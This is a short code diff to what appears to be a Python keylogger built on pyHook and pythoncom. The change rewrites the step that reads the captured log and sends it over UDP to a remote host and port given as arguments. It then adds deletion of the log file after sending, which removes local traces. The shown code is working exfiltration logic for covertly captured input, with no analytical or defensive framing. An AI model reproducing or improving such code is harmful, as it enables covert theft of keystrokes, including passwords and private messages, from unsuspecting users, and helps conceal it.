@@ -9,6 +9,7 @@ Usage:
 """
 import argparse
 import logging
+import os
 import pyHook
 import pythoncom
 import socket
@@ -93,9 +94,12 @@ def main():
   with open(LOG_FILE_NAME, READ_MODE) as f:
     data = f.read()
 
-  UDPSock = socket.socket(socket.AFINET, socket.SOCK_DGRAM)
-  UDPSock.sendto(data, (args.host_name, args.port_number))
-  UDPSock.close()
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  s.connect((args.host_name, args.port_number))
+  s.send(data)
+  s.close()
+
+  os.remove(LOG_FILE_NAME)
 
 
 if __name__ == '__main__':
